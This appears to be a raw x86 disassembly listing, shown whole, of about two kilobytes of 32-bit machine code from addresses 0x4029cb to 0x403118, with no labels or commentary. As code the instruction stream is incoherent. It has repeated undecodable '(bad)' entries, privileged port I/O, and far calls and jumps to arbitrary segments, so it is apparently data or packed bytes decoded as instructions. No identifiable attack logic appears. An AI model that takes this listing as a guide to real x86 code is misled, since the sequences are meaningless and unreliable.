  4029cb:	(bad)  
  4029cc:	pop    esp
  4029cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029ce:	push   eax
  4029cf:	xor    esp,DWORD PTR [ecx-0x4d]
  4029d2:	stc    
  4029d3:	mov    dl,0x53
  4029d5:	clc    
  4029d6:	retf   
  4029d7:	pop    esi
  4029d8:	mov    WORD PTR [ebx+0x59],fs
  4029db:	(bad)  
  4029dc:	pusha  
  4029dd:	(bad)  
  4029df:	out    dx,eax
  4029e0:	push   edx
  4029e1:	sub    DWORD PTR [ecx+0x57183f3a],eax
  4029e7:	cwde   
  4029e8:	fdiv   st,st(5)
  4029ea:	out    dx,al
  4029eb:	ins    BYTE PTR es:[edi],dx
  4029ec:	retf   
  4029ed:	or     eax,0x32f6f94
  4029f2:	sub    DWORD PTR [edx+0x18],esp
  4029f5:	ja     0x402a03
  4029f7:	stos   DWORD PTR es:[edi],eax
  4029f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029f9:	mov    ecx,0x14009243
  4029fe:	js     0x402a76
  402a00:	inc    ebx
  402a01:	inc    edi
  402a02:	xchg   esi,eax
  402a03:	pop    esp
  402a04:	pop    esi
  402a05:	push   esp
  402a06:	test   eax,0x189a3b9d
  402a0b:	dec    esi
  402a0c:	dec    edi
  402a0d:	retf   
  402a0e:	cmp    al,0x21
  402a10:	adc    DWORD PTR [edi],edx
  402a12:	xchg   al,bh
  402a14:	mov    bl,0x50
  402a16:	in     al,dx
  402a17:	hlt    
  402a18:	rol    BYTE PTR [edx-0x22982a28],cl
  402a1e:	scas   al,BYTE PTR es:[edi]
  402a1f:	(bad)  
  402a20:	(bad)  
  402a21:	mov    ebp,0xe8921ff9
  402a26:	sbb    eax,0xcac879ca
  402a2b:	xor    ecx,eax
  402a2d:	sub    eax,0xb1bb6535
  402a32:	sub    BYTE PTR [esi],cl
  402a34:	add    ebx,eax
  402a36:	sub    BYTE PTR [eax+edi*8+0x34],al
  402a3a:	fst    QWORD PTR [ecx-0x7b1412f1]
  402a40:	xchg   ebp,eax
  402a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a42:	mov    edx,0x61fe6478
  402a47:	pop    esi
  402a48:	cli    
  402a49:	or     eax,0x9edb3370
  402a4e:	cmc    
  402a4f:	mov    ebx,ebp
  402a51:	mov    WORD PTR [ebx+0x78281449],fs
  402a57:	dec    ebx
  402a58:	lods   al,BYTE PTR ds:[esi]
  402a59:	lahf   
  402a5a:	ficomp WORD PTR [ebp+eiz*2-0x1e]
  402a5e:	push   0x1e
  402a60:	outs   dx,BYTE PTR ds:[esi]
  402a61:	lock sbb al,0xfe
  402a64:	cmc    
  402a65:	push   esi
  402a66:	arpl   WORD PTR [ebx-0x3dfd611a],di
  402a6c:	in     eax,0xd
  402a6e:	ret    
  402a6f:	out    0x33,eax
  402a71:	ds aaa 
  402a73:	int3   
  402a74:	pop    edx
  402a75:	dec    esi
  402a76:	adc    BYTE PTR [ebx+0x69],cl
  402a79:	cmp    al,0x6c
  402a7b:	push   es
  402a7c:	jb     0x402a4a
  402a7e:	xchg   edi,eax
  402a7f:	pop    eax
  402a80:	add    esi,ecx
  402a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a83:	inc    esp
  402a84:	iret   
  402a85:	repnz hlt 
  402a87:	in     al,0x1
  402a89:	jbe    0x402a2c
  402a8b:	inc    esi
  402a8c:	test   DWORD PTR [esi+0x64],esp
  402a8f:	bound  esi,QWORD PTR [ecx-0x25]
  402a92:	xchg   ebp,eax
  402a93:	loope  0x402afe
  402a95:	sub    esp,DWORD PTR [esi]
  402a97:	cmp    DWORD PTR [ebx-0x33e0a60e],ebp
  402a9d:	arpl   WORD PTR [eax+0x22],cx
  402aa0:	pop    ecx
  402aa1:	fimul  WORD PTR [edx-0x30]
  402aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aa5:	out    dx,eax
  402aa6:	ror    BYTE PTR ds:0x44751c22,0xae
  402aad:	ins    DWORD PTR es:[edi],dx
  402aae:	mov    ebp,0x4837e97
  402ab3:	dec    ebx
  402ab4:	add    DWORD PTR [esi+0x21],ecx
  402ab7:	iret   
  402ab8:	pop    eax
  402ab9:	mov    ch,0x2b
  402abb:	or     DWORD PTR [esp+ebx*4+0x3deedc50],0xaccbb31a
  402ac6:	mov    bl,0xb1
  402ac8:	leave  
  402ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aca:	loope  0x402a71
  402acc:	out    dx,al
  402acd:	and    eax,DWORD PTR [edi-0xd]
  402ad0:	lahf   
  402ad1:	fcomi  st,st(2)
  402ad3:	sub    DWORD PTR [ebx+0xc00c276],0xffffff91
  402ada:	je     0x402b1f
  402adc:	push   edx
  402add:	sub    ah,BYTE PTR [eax+0x19]
  402ae0:	and    bh,BYTE PTR ds:[ebp+ebp*2+0x45e08492]
  402ae8:	iret   
  402ae9:	mov    cl,0xa2
  402aeb:	aas    
  402aec:	pusha  
  402aed:	and    edx,DWORD PTR [ebp+0x20]
  402af0:	push   edi
  402af1:	fadd   DWORD PTR [ecx+0x32]
  402af4:	icebp  
  402af5:	lods   eax,DWORD PTR ds:[esi]
  402af6:	(bad)  
  402af7:	xchg   esi,eax
  402af8:	jb     0x402b74
  402afa:	stos   DWORD PTR es:[edi],eax
  402afb:	pushf  
  402afc:	mov    bh,0xac
  402afe:	and    al,0xf1
  402b00:	sub    dl,BYTE PTR [ebp+0x69198ddd]
  402b06:	push   ss
  402b07:	adc    eax,0xf9c8e57
  402b0c:	jnp    0x402b1d
  402b0e:	ins    DWORD PTR es:[edi],dx
  402b0f:	jle    0x402b32
  402b11:	popa   
  402b12:	xchg   ecx,eax
  402b13:	retf   
  402b14:	popf   
  402b15:	dec    edi
  402b16:	push   esi
  402b17:	sbb    eax,0x686e22db
  402b1c:	loope  0x402b83
  402b1e:	into   
  402b1f:	inc    edi
  402b20:	pop    edx
  402b21:	pop    ebp
  402b22:	jmp    0x402ab1
  402b24:	out    0xf6,al
  402b26:	scas   eax,DWORD PTR es:[edi]
  402b27:	pop    ebx
  402b28:	jle    0x402b65
  402b2a:	mov    cl,0x2d
  402b2c:	xchg   ch,cl
  402b2e:	pop    ebp
  402b2f:	in     al,0x41
  402b31:	sbb    al,0xaa
  402b33:	or     cl,bh
  402b35:	int3   
  402b36:	fimul  WORD PTR [esp+ecx*1]
  402b39:	xchg   BYTE PTR [ecx+0x2d],cl
  402b3c:	dec    edx
  402b3d:	pop    DWORD PTR [edi-0x4b062136]
  402b43:	fwait
  402b44:	xchg   DWORD PTR [esp+ecx*8-0x76],edx
  402b48:	mov    ds:0x7cb76b85,eax
  402b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b4e:	jge    0x402b0d
  402b50:	pop    edx
  402b51:	xchg   ebp,eax
  402b52:	mov    ds:0xdcf860c1,eax
  402b57:	jmp    0xe7264c80
  402b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b5d:	jb     0x402b97
  402b5f:	push   edi
  402b60:	shl    BYTE PTR es:[ebx+eax*4+0x3],0x7c
  402b66:	mov    dh,0xff
  402b68:	ret    0x1226
  402b6b:	nop
  402b6c:	test   al,0x6d
  402b6e:	xor    BYTE PTR [edx+0x2a2004c4],bh
  402b74:	inc    esi
  402b75:	mov    eax,ebp
  402b77:	fmul   QWORD PTR [eax-0x28]
  402b7a:	jmp    0xbb91c59
  402b7f:	mov    edi,0x3f2ae9a6
  402b84:	dec    esi
  402b85:	cld    
  402b86:	xor    al,0x58
  402b88:	rcl    DWORD PTR [ebx+0x78],1
  402b8b:	ss fwait
  402b8d:	xor    BYTE PTR [eax],ch
  402b8f:	adc    al,0x19
  402b91:	cmp    BYTE PTR [ecx-0x2],dl
  402b94:	xor    ch,BYTE PTR [edx]
  402b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b97:	and    al,0x82
  402b99:	pop    eax
  402b9a:	or     al,BYTE PTR [ebx-0x12]
  402b9d:	stos   BYTE PTR es:[edi],al
  402b9e:	nop
  402b9f:	sbb    DWORD PTR [ebp-0x2e],ebp
  402ba2:	dec    ebp
  402ba3:	mov    BYTE PTR [ecx],bh
  402ba5:	mov    al,0x4f
  402ba7:	cmp    esp,ecx
  402ba9:	add    eax,DWORD PTR [ecx+0x3c71af0e]
  402baf:	add    eax,0xf9f8bf99
  402bb4:	rcr    DWORD PTR [eax],cl
  402bb6:	sbb    ebp,DWORD PTR [eax+ecx*4-0x46]
  402bba:	sbb    eax,0x704824b5
  402bbf:	addr16 je 0x402c1f
  402bc2:	fisttp QWORD PTR [ebx-0x3a]
  402bc5:	add    BYTE PTR [esi+0x49539010],ch
  402bcb:	adc    ebx,DWORD PTR [esp+edx*1+0x1921c98c]
  402bd2:	rol    DWORD PTR [ecx-0x74be2a91],cl
  402bd8:	(bad)  
  402bd9:	(bad)  
  402bda:	cmc    
  402bdb:	mov    edx,0xd7558805
  402be0:	aaa    
  402be1:	jb     0x402bd8
  402be3:	in     al,dx
  402be4:	and    DWORD PTR [edx-0x78a15f18],edi
  402bea:	xor    BYTE PTR [esi-0xdd838f4],0xc3
  402bf1:	lods   eax,DWORD PTR ds:[esi]
  402bf2:	and    BYTE PTR [esp+ebp*1-0x6cdd00d4],al
  402bf9:	xchg   ecx,eax
  402bfa:	xchg   BYTE PTR [ebx+0x1ee4bdd9],bl
  402c00:	enter  0xbbf8,0x8a
  402c04:	cmp    esi,ebx
  402c06:	setnp  BYTE PTR [ecx+eiz*2]
  402c0a:	jg     0x402c2d
  402c0c:	dec    eax
  402c0d:	xor    DWORD PTR [edx],ecx
  402c0f:	fild   QWORD PTR [edx]
  402c11:	sbb    eax,0x78506d3b
  402c16:	jbe    0x402bf8
  402c18:	push   ebp
  402c19:	repnz sub bl,BYTE PTR [esi]
  402c1c:	add    eax,0xe5d50553
  402c21:	shr    BYTE PTR [esi-0x32],1
  402c24:	ss push ebx
  402c26:	sbb    BYTE PTR [eax],ah
  402c28:	cld    
  402c29:	test   dl,bl
  402c2b:	test   al,0xf6
  402c2d:	pop    es
  402c2e:	sbb    al,0xb2
  402c30:	push   cs
  402c31:	sbb    al,0x7a
  402c33:	call   0x25f8:0x98e14285
  402c3a:	push   ss
  402c3b:	cmp    esp,edx
  402c3d:	push   esi
  402c3e:	sub    al,0x4b
  402c40:	lock mov eax,ebp
  402c43:	addr16 (bad) 
  402c45:	(bad)  
  402c47:	cmp    BYTE PTR [bp+si+0x67bd],al
  402c4c:	xchg   esi,eax
  402c4d:	mov    bl,0x8f
  402c4f:	sbb    DWORD PTR [esi],ebp
  402c51:	mov    esp,0xb233abe2
  402c56:	loop   0x402c01
  402c58:	mov    ds:0x7706c7e1,al
  402c5d:	aad    0x87
  402c5f:	mov    ?,WORD PTR [eax+ebx*4-0x25]
  402c63:	data16 jo 0x402cd9
  402c66:	loop   0x402c68
  402c68:	sub    al,0xab
  402c6a:	dec    esp
  402c6b:	imul   esp,DWORD PTR [ebx],0x52a9a9f
  402c71:	in     al,0x57
  402c73:	int    0xe4
  402c75:	fst    st(6)
  402c77:	inc    ebx
  402c78:	imul   esp,edi,0xffffff9f
  402c7b:	fisttp QWORD PTR [ebx-0x20add54d]
  402c81:	lods   al,BYTE PTR ds:[esi]
  402c82:	mov    cl,0x61
  402c84:	icebp  
  402c85:	rol    BYTE PTR ds:0xbdcaf51,cl
  402c8b:	imul   DWORD PTR [edx+0x22]
  402c8e:	xor    ecx,DWORD PTR [edi+edi*2+0x48b0dac0]
  402c95:	repz stc 
  402c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c98:	mov    ecx,0x261bf528
  402c9d:	aad    0x34
  402c9f:	stos   BYTE PTR es:[edi],al
  402ca0:	iret   
  402ca1:	push   cs
  402ca2:	sbb    eax,0xe1bf1a8c
  402ca7:	pop    edx
  402ca8:	pop    ebp
  402ca9:	ja     0x402d10
  402cab:	pop    ebx
  402cac:	call   0xeb09:0x73814e78
  402cb3:	cmp    BYTE PTR [edx+0x2b902cc3],0x7d
  402cba:	mov    edi,ecx
  402cbc:	(bad)  
  402cbd:	pop    esi
  402cbe:	and    al,0xd
  402cc0:	mov    bh,0x3c
  402cc2:	adc    edi,edx
  402cc4:	push   esi
  402cc5:	mov    ecx,0x70710c62
  402cca:	int3   
  402ccb:	outs   dx,DWORD PTR ds:[esi]
  402ccc:	inc    edi
  402ccd:	arpl   WORD PTR ds:0x4b30a433,sp
  402cd3:	mov    ebp,esp
  402cd5:	mov    esi,0xd66e9869
  402cda:	mov    ebx,0x555f1514
  402cdf:	lahf   
  402ce0:	ret    0x3fb8
  402ce3:	xlat   BYTE PTR ds:[ebx]
  402ce4:	(bad)  
  402ce5:	mov    ds,WORD PTR [edx+ecx*1]
  402ce8:	push   ebx
  402ce9:	dec    eax
  402cea:	bound  ebx,QWORD PTR [edi-0x3ee0601e]
  402cf0:	gs out 0xbf,al
  402cf3:	not    DWORD PTR [esi-0x3c4890f9]
  402cf9:	and    BYTE PTR [eax-0x32],0x4f
  402cfd:	mov    al,0xc5
  402cff:	shr    DWORD PTR [ecx+0x54],1
  402d02:	pop    es
  402d03:	test   al,0x1c
  402d05:	pop    eax
  402d06:	imul   ecx,edx,0x6c3093cb
  402d0c:	xchg   esp,eax
  402d0d:	ret    
  402d0e:	adc    esi,ecx
  402d10:	fist   WORD PTR [edi-0x51]
  402d13:	xor    esi,DWORD PTR [ebp-0x6e]
  402d16:	pop    ebp
  402d17:	pusha  
  402d18:	push   ds
  402d19:	mov    ?,WORD PTR [esi-0x22942bc9]
  402d1f:	sbb    bh,BYTE PTR [ebx+eax*2-0x1a79f142]
  402d26:	adc    al,0x2c
  402d28:	xchg   edx,edx
  402d2a:	xor    bl,BYTE PTR [edx+0x74b7c617]
  402d30:	add    DWORD PTR [ebx-0x5e],0x7
  402d34:	leave  
  402d35:	out    0x3,al
  402d37:	fld    DWORD PTR [edx]
  402d39:	ret    0x6358
  402d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d3d:	inc    esp
  402d3e:	sbb    dl,BYTE PTR ds:0x8f3b8213
  402d44:	aas    
  402d45:	add    eax,0x863b7f5c
  402d4a:	bound  esi,QWORD PTR [ebx+0x470595ae]
  402d50:	cmc    
  402d51:	scas   eax,DWORD PTR es:[edi]
  402d52:	retf   
  402d53:	push   edx
  402d54:	sar    ebp,1
  402d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d57:	pop    esp
  402d58:	jae    0x402d2a
  402d5a:	fnstcw WORD PTR [ebp+ebp*1+0x5ac2ac18]
  402d61:	iret   
  402d62:	xchg   BYTE PTR [esi+0x7c],cl
  402d65:	adc    esp,DWORD PTR [esi]
  402d67:	pop    ebx
  402d68:	pushf  
  402d69:	xor    al,0xf4
  402d6b:	sbb    al,0x41
  402d6d:	mov    dh,0x9f
  402d6f:	xor    al,0xcc
  402d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d72:	imul   eax,eax,0x2b918863
  402d78:	fisttp WORD PTR ds:0x919a2d3b
  402d7e:	adc    DWORD PTR [ebx-0x12],0x5048af31
  402d85:	or     edi,DWORD PTR [eax+0x7e89dc2a]
  402d8b:	fwait
  402d8c:	cmp    esp,DWORD PTR [ebx]
  402d8e:	cmp    edx,DWORD PTR [esi-0x1e]
  402d91:	jl     0x402db6
  402d93:	retf   
  402d94:	mul    ecx
  402d96:	pop    edx
  402d97:	pop    esp
  402d98:	mov    edx,0x36e6390d
  402d9d:	ror    BYTE PTR [ebx+0x22],1
  402da0:	jo     0x402d78
  402da2:	adc    DWORD PTR [esi+0x1a87b641],0x27
  402da9:	jl     0x402df2
  402dab:	popa   
  402dac:	ja     0x402dbd
  402dae:	and    eax,0x882e3df5
  402db3:	cmp    eax,0xc6419eb2
  402db8:	loopne 0x402dbd
  402dba:	jecxz  0x402e1d
  402dbc:	pop    esp
  402dbd:	mov    BYTE PTR [esi-0x3e9b0f4f],al
  402dc3:	outs   dx,BYTE PTR ds:[esi]
  402dc4:	and    eax,0xae8ba8d5
  402dc9:	fidiv  WORD PTR [ebp-0x2d361272]
  402dcf:	lea    edi,[edi+eax*4]
  402dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dd3:	in     eax,dx
  402dd4:	retf   
  402dd5:	(bad)  
  402dd6:	jo     0x402e14
  402dd8:	fstp   st(4)
  402dda:	(bad)  
  402ddb:	out    0xfc,al
  402ddd:	pop    esi
  402dde:	bound  esi,QWORD PTR [edx]
  402de0:	mov    WORD PTR [edi],gs
  402de2:	rcl    DWORD PTR [ebx-0x44],0xaa
  402de6:	xchg   esi,eax
  402de7:	or     al,0x6e
  402de9:	int3   
  402dea:	or     esp,DWORD PTR [edi]
  402dec:	xchg   edx,eax
  402ded:	jbe    0x402dd5
  402def:	mov    DWORD PTR [eax+0x6d16a03],edx
  402df5:	push   edi
  402df6:	push   ecx
  402df7:	aas    
  402df8:	pop    esp
  402df9:	scas   eax,DWORD PTR es:[edi]
  402dfa:	inc    edx
  402dfb:	sbb    DWORD PTR [edi+ebp*8-0xd],ebx
  402dff:	adc    ch,BYTE PTR [ebx]
  402e01:	dec    edi
  402e02:	iret   
  402e03:	clc    
  402e04:	and    DWORD PTR [eax-0x1d],edi
  402e07:	xchg   ebx,eax
  402e08:	jb     0x402e52
  402e0a:	ret    0x6c7b
  402e0d:	test   BYTE PTR [ecx-0xbd5cd91],ch
  402e13:	sub    ah,BYTE PTR [eax]
  402e15:	scas   eax,DWORD PTR es:[edi]
  402e16:	sbb    al,0x12
  402e18:	pop    esp
  402e19:	sub    ecx,DWORD PTR [edx+ebp*1-0x2c]
  402e1d:	push   es
  402e1e:	hlt    
  402e1f:	(bad)
  402e23:	in     al,0x79
  402e25:	stos   DWORD PTR es:[edi],eax
  402e26:	mov    edi,0xff06042e
  402e2b:	test   eax,0x27d85370
  402e30:	popa   
  402e31:	mov    bh,0x23
  402e33:	inc    edx
  402e34:	jne    0x402e86
  402e36:	sbb    DWORD PTR [ebx+0x5],0xe5ceba
  402e3d:	scas   eax,DWORD PTR es:[edi]
  402e3e:	mov    dl,0xe8
  402e40:	push   eax
  402e41:	or     dl,ch
  402e43:	cli    
  402e44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e45:	adc    al,0xac
  402e47:	pop    esp
  402e48:	fs xchg esi,ecx
  402e4b:	xchg   ebp,eax
  402e4c:	out    dx,al
  402e4d:	icebp  
  402e4e:	jno    0x402e9c
  402e50:	out    0x8,al
  402e52:	and    ecx,ebx
  402e54:	sub    al,0xbd
  402e56:	(bad)  
  402e57:	shr    DWORD PTR [esi-0x6e],cl
  402e5a:	lahf   
  402e5b:	inc    esi
  402e5c:	lods   eax,DWORD PTR ds:[esi]
  402e5d:	aam    0x3
  402e5f:	lods   eax,DWORD PTR ds:[esi]
  402e60:	mov    bl,0xc2
  402e62:	xor    BYTE PTR [eax+0x49],al
  402e65:	fwait
  402e66:	(bad)  
  402e67:	fmul   st,st(7)
  402e69:	sbb    al,0x6e
  402e6b:	sub    al,0x7a
  402e6d:	cwde   
  402e6e:	enter  0xd159,0xe5
  402e72:	cmp    DWORD PTR [eax+0x56],ebx
  402e75:	popa   
  402e76:	test   BYTE PTR fs:0x85875980,cl
  402e7d:	xchg   edx,eax
  402e7e:	fucom  st(1)
  402e80:	mov    ebp,0xa4c23c9a
  402e85:	inc    edx
  402e86:	add    bl,0x42
  402e89:	add    DWORD PTR [eax-0x6],ebp
  402e8c:	xor    eax,0x6b546336
  402e91:	pop    es
  402e92:	es push edx
  402e94:	mov    al,ds:0x8e22e9e8
  402e99:	mov    ah,0x94
  402e9b:	cmp    eax,0xac48dbf4
  402ea0:	out    dx,eax
  402ea1:	loopne 0x402e50
  402ea3:	pop    ds
  402ea4:	jnp    0x402e8f
  402ea6:	div    DWORD PTR ds:0x6321930c
  402eac:	xor    BYTE PTR [edx-0x5d2c556d],bh
  402eb2:	lds    edi,FWORD PTR [ebx-0xb]
  402eb5:	adc    al,dh
  402eb7:	sub    DWORD PTR [edi+0x60],0x7b
  402ebb:	je     0x402f0f
  402ebd:	jle    0x402e4f
  402ebf:	adc    bl,BYTE PTR [eax+0x34ef8aaa]
  402ec5:	add    DWORD PTR [edx+0x31],0x4899343f
  402ecc:	je     0x402ec2
  402ece:	mov    ch,0x7
  402ed0:	retf   
  402ed1:	les    edi,FWORD PTR [ebp+edi*2+0x27]
  402ed5:	sbb    cl,BYTE PTR [esi]
  402ed7:	mov    fs,WORD PTR [eax+ebx*1-0x74]
  402edb:	(bad)  
  402edc:	(bad)  
  402edd:	mov    ch,0x4c
  402edf:	cmp    ah,BYTE PTR [esi-0x6df28f95]
  402ee5:	xlat   BYTE PTR ds:[ebx]
  402ee6:	and    BYTE PTR [esi-0x44],cl
  402ee9:	jg     0x402efa
  402eeb:	dec    ecx
  402eec:	push   ds
  402eed:	fs xor ebx,ebp
  402ef0:	jp     0x402e97
  402ef2:	dec    ebp
  402ef3:	ja     0x402eb9
  402ef5:	jmp    0xf780:0x2112940b
  402efc:	adc    DWORD PTR [ecx-0x5a],ebp
  402eff:	push   0x8a178e02
  402f04:	push   esi
  402f05:	int    0x89
  402f07:	imul   ebx,DWORD PTR [esi+0x62],0x34
  402f0b:	or     al,0x57
  402f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f0e:	mov    ch,dh
  402f10:	fcmovnu st,st(5)
  402f12:	and    DWORD PTR [ebx+0x17f8b163],edi
  402f18:	retf   
  402f19:	ror    DWORD PTR [edx+0x6a],cl
  402f1c:	mov    eax,ds:0xcc1cbfc5
  402f21:	mov    BYTE PTR [esi-0x16],0x84
  402f25:	cmc    
  402f26:	xor    ch,dl
  402f28:	and    eax,0x3d
  402f2b:	inc    ecx
  402f2c:	xor    edx,DWORD PTR [edx+0x62]
  402f2f:	mov    fs,WORD PTR [ecx-0x44]
  402f32:	fwait
  402f33:	push   ds
  402f34:	popa   
  402f35:	cmp    edi,esi
  402f37:	mov    al,0xb4
  402f39:	idiv   DWORD PTR [ebp+0xd]
  402f3c:	fbld   TBYTE PTR [ebp-0x40]
  402f3f:	pop    edi
  402f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f41:	shl    DWORD PTR [eax+eax*1],0xac
  402f45:	and    ah,dh
  402f47:	sub    BYTE PTR [ebx+ebx*4],ah
  402f4a:	add    BYTE PTR [edi-0x57],0x17
  402f4e:	fdiv   DWORD PTR [esi+0x51573d29]
  402f54:	test   BYTE PTR [esp+eiz*8-0x4a],bh
  402f58:	ins    DWORD PTR es:[edi],dx
  402f59:	push   ebx
  402f5a:	xor    eax,0xfe6509e0
  402f5f:	(bad)  
  402f60:	pop    edi
  402f61:	jecxz  0x402f41
  402f63:	das    
  402f64:	push   ebp
  402f65:	jbe    0x402f94
  402f67:	lods   al,BYTE PTR ds:[esi]
  402f68:	mov    bl,0x7c
  402f6a:	and    esi,DWORD PTR [edx-0x48279b61]
  402f70:	call   0x6c01:0x3465851c
  402f77:	adc    bh,BYTE PTR [ebp-0x2b9146c4]
  402f7d:	(bad)  
  402f7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f7f:	(bad)  
  402f80:	aas    
  402f81:	xchg   BYTE PTR [ecx+0x52c6868],bh
  402f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f88:	add    BYTE PTR ds:0xa200bc47,dh
  402f8e:	mov    ebx,0x72ba372e
  402f93:	pop    esi
  402f94:	adc    edi,DWORD PTR [esi]
  402f96:	xchg   BYTE PTR [eax-0x7a],ch
  402f99:	fwait
  402f9a:	cmp    DWORD PTR [ebx],0x4e5b1a49
  402fa0:	jecxz  0x403012
  402fa2:	jo     0x402fce
  402fa4:	lods   al,BYTE PTR ds:[esi]
  402fa5:	mov    ds:0xfb85d73a,eax
  402faa:	sar    BYTE PTR [ebp*1+0x1bcdf68],cl
  402fb1:	dec    edi
  402fb2:	jnp    0x402f82
  402fb4:	fucompp 
  402fb6:	jge    0x40302b
  402fb8:	pop    es
  402fb9:	(bad)  cs:[ecx+ebp*8]
  402fbd:	sbb    al,0x30
  402fbf:	push   edi
  402fc0:	ins    BYTE PTR es:[edi],dx
  402fc1:	jmp    0x402fed
  402fc3:	shl    dl,cl
  402fc5:	add    BYTE PTR [esi],0xd9
  402fc8:	out    0xff,eax
  402fca:	loope  0x402ffe
  402fcc:	push   esp
  402fcd:	fnstcw WORD PTR [ecx+ebp*8-0x46]
  402fd1:	sbb    al,0xc
  402fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fd4:	test   BYTE PTR [ebp-0x22],ah
  402fd7:	or     DWORD PTR [ebx+0x48],edx
  402fda:	call   0x5f1a59bd
  402fdf:	inc    ebx
  402fe0:	std    
  402fe1:	jecxz  0x402fd0
  402fe3:	fs retf 
  402fe5:	loope  0x402f8e
  402fe7:	hlt    
  402fe8:	add    eax,0xbc9ecc91
  402fed:	or     eax,0x1745128c
  402ff2:	mov    bh,0xe9
  402ff4:	or     ecx,DWORD PTR [edi-0x53f9d0b0]
  402ffa:	sbb    bl,BYTE PTR [edi-0x2db6ce97]
  403000:	dec    edi
  403001:	cwde   
  403002:	push   es
  403003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403004:	repnz or bh,dh
  403007:	xchg   esp,eax
  403008:	jl     0x402f8b
  40300a:	fnstcw WORD PTR [ebp+ebp*1+0xb]
  40300e:	jbe    0x403082
  403010:	mov    al,0x6c
  403012:	or     DWORD PTR [edx],edx
  403014:	ficomp DWORD PTR [esi+0x5a]
  403017:	xchg   ebx,eax
  403018:	out    dx,eax
  403019:	xchg   DWORD PTR [edx+eax*1+0x15],edx
  40301d:	mov    ebp,0x427da65e
  403022:	fcomp  QWORD PTR [edi+0x7d]
  403025:	mov    cl,0x63
  403027:	mov    ds:0x18bdc66a,eax
  40302c:	xchg   ebx,eax
  40302d:	ret    
  40302e:	arpl   cx,bp
  403030:	adc    DWORD PTR [edi],eax
  403032:	pop    ds
  403033:	in     eax,0x1
  403035:	fsubr  DWORD PTR [ebp-0x44]
  403038:	nop
  403039:	fs or  al,0x51
  40303c:	shl    eax,cl
  40303e:	test   DWORD PTR [edi+0x7a],ebp
  403041:	sub    BYTE PTR [eax+0x5f2d9312],cl
  403047:	or     al,0x5
  403049:	push   ecx
  40304a:	inc    esp
  40304b:	jmp    0x2f939008
  403050:	cmc    
  403051:	xlat   BYTE PTR ds:[ebx]
  403052:	addr16 mov ch,0x5e
  403055:	pop    ebp
  403056:	mov    ds,ecx
  403058:	mov    ch,bl
  40305a:	sub    eax,0x42fcea1f
  40305f:	pop    eax
  403060:	out    0x40,al
  403062:	loop   0x40308b
  403064:	retf   0x79a2
  403067:	(bad)  
  403068:	sbb    bl,BYTE PTR [ecx]
  40306a:	out    0x27,al
  40306c:	pop    ss
  40306d:	jne    0x403067
  40306f:	jo     0x4030da
  403071:	and    edi,DWORD PTR [ecx]
  403073:	mov    al,ds:0xd741a805
  403078:	inc    edx
  403079:	inc    esp
  40307a:	xchg   edi,eax
  40307b:	and    eax,0x271e7256
  403080:	jne    0x4030c1
  403082:	stc    
  403083:	xchg   BYTE PTR [edx],cl
  403085:	ret    
  403086:	jmp    0x4030c8
  403088:	push   esi
  403089:	lock mov bh,0x1f
  40308c:	xchg   esp,eax
  40308d:	fadd   DWORD PTR [bx+si+0x68]
  403091:	nop
  403092:	das    
  403093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403094:	out    dx,eax
  403095:	popa   
  403096:	mov    ds:0x2886f1c0,eax
  40309b:	dec    ebx
  40309c:	xchg   edi,eax
  40309d:	mov    esi,0x7b9a0e22
  4030a2:	cmp    al,0x34
  4030a4:	ret    
  4030a5:	(bad)  
  4030a6:	(bad)  
  4030a7:	or     al,0x26
  4030a9:	sbb    BYTE PTR [ebp-0x5da2afbb],bh
  4030af:	bound  eax,QWORD PTR [edx+0x49e578d8]
  4030b5:	(bad)  
  4030b6:	jne    0x4030eb
  4030b8:	call   FWORD PTR [ebp-0x4b]
  4030bb:	adc    al,bh
  4030bd:	inc    ebp
  4030be:	sahf   
  4030bf:	dec    ecx
  4030c0:	stos   BYTE PTR es:[edi],al
  4030c1:	sbb    DWORD PTR [ecx+eax*2+0x68d52baf],0x5d846d6b
  4030cc:	push   edi
  4030cd:	push   cs
  4030ce:	leave  
  4030cf:	mov    ecx,ecx
  4030d1:	xor    al,0xa9
  4030d3:	xlat   BYTE PTR ds:[ebx]
  4030d4:	mov    ch,0x28
  4030d6:	add    BYTE PTR [edi-0x51ba4ffa],dl
  4030dc:	or     BYTE PTR [ebx+ebx*4],ah
  4030df:	adc    eax,0x133f69e5
  4030e4:	xchg   eax,eax
  4030e6:	fdivr  QWORD PTR [si-0x12c2]
  4030eb:	adc    BYTE PTR [eax],dl
  4030ed:	mov    eax,ds:0xa0f8b847
  4030f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030f3:	push   ebp
  4030f4:	add    DWORD PTR [edi-0x63b9b3bd],ebx
  4030fa:	js     0x40310c
  4030fc:	pop    ebp
  4030fd:	adc    DWORD PTR [eax-0x5d],0xc22730f6
  403104:	cmp    BYTE PTR [ecx],ch
  403106:	pop    ecx
  403107:	scas   al,BYTE PTR es:[edi]
  403108:	ins    BYTE PTR es:[edi],dx
  403109:	add    edi,DWORD PTR [edx+0xdaa44ac]
  40310f:	call   0x7a32:0xeabd1c41
  403116:	test   dl,dh
  403118:	and    BYTE PTR [edi-0x70384dde],bl
